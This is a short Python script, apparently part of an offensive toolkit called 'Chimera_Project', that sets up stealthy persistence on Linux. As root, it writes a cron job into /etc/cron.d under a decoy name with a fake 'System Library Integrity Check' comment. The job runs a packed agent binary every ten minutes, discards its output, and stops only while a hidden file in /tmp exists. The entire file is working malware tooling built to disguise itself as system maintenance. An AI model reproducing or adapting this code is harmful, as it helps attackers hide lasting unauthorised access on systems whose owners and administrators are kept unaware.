#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys

class CronGhost:
    """
    Agent 425: System-Level Persistence.
    Injects high-stealth cron fragments into /etc/cron.d/ 
    masqueraded as legitimate system maintenance tasks.
    """
    def __init__(self, agent_path):
        self.target_dir = "/etc/cron.d"
        self.agent_path = agent_path
        # Boring name to blend in with '0hourly', 'apache2', etc.
        self.fragment_name = "0sys-lib-check"

    def install(self):
        print(f"--- [AGENT 425: CRON GHOST PERSISTENCE START] ---")
        
        if os.getuid() != 0:
            print("[!] Critical: Writing to /etc/cron.d requires Root.")
            return

        # The Command: Run every 10 minutes, check for a 'Muzzle' file.
        # If the muzzle file exists, do nothing. If not, run Chimera.
        # This allows you to 'Silence' the agent without deleting the cron.
        muzzle_file = "/tmp/.sys_lib_conf"
        cron_command = (
            f"*/10 * * * * root [ ! -f {muzzle_file} ] && "
            f"{self.agent_path} > /dev/null 2>&1\n"
        )

        fragment_path = os.path.join(self.target_dir, self.fragment_name)

        try:
            with open(fragment_path, "w") as f:
                f.write("# System Library Integrity Check\n")
                f.write(cron_command)
            
            # Match permissions of other system fragments
            os.chmod(fragment_path, 0o644)
            
            print(f"[\033[92mSUCCESS\033[0m] Persistence established in {fragment_path}")
            print(f"[*] Trigger: Every 10 minutes. Kill-switch: touch {muzzle_file}")
            
        except Exception as e:
            print(f"[!] Installation failed: {e}")

if __name__ == "__main__":
    # Point to the Agent 420 (Packed) binary for maximum stealth
    path = "/home/dan/Chimera_Project/agents/420_Payload_Packer/src/packed_agent"
    CronGhost(path).install()
